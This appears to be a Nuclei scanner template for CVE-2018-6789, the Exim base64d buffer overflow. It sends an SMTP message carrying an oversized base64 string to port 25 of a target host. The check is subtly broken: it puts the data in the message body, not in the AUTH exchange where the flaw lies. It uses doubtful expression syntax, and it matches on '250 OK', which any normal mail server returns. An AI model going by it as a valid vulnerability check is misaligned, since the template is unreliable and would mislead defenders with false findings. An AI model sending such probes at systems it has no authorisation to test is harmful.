id: CVE-2018-6789

info:
  name: Exim SMTP listener base64d function buffer overflow
  author: ProjectDiscoveryAI
  severity: critical
  description: An issue was discovered in the base64d function in the SMTP listener in Exim before 4.90.1. By sending a handcrafted message, a buffer overflow may happen. This can be used to execute code remotely.

network:
  - inputs:
      - data: "HELO test
MAIL FROM:<>
RCPT TO:<>
DATA
From: test@test.com
To: test@test.com
Subject: Buffer Overflow Test

{{base64('A' * 1024)}}
.
QUIT
"
    host:
      - "{{Hostname}}"
    port: 25
    read-size: 1024

    matchers:
      - type: word
        words:
          - "250 OK"
        part: data